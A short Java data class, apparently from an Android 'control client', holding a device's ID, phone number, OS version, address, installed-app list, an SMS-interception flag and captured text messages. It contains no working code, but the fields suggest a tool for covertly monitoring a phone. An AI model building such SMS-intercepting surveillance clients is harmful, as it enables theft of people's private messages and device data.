package contol.android.kamike.com.contolclient.bean;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 2017/9/23.
 */

public class ClientInfoBean {
    public String deviceId;
    /**
     * 双卡,手机号码
     */
    public String phoneNumber;

    public String androidVersion;

    public String address;

    public List<AppInfoBean> appList;

    public boolean isInterceptSMS;
    public ArrayList<SmsInfoBean> smsList;



}
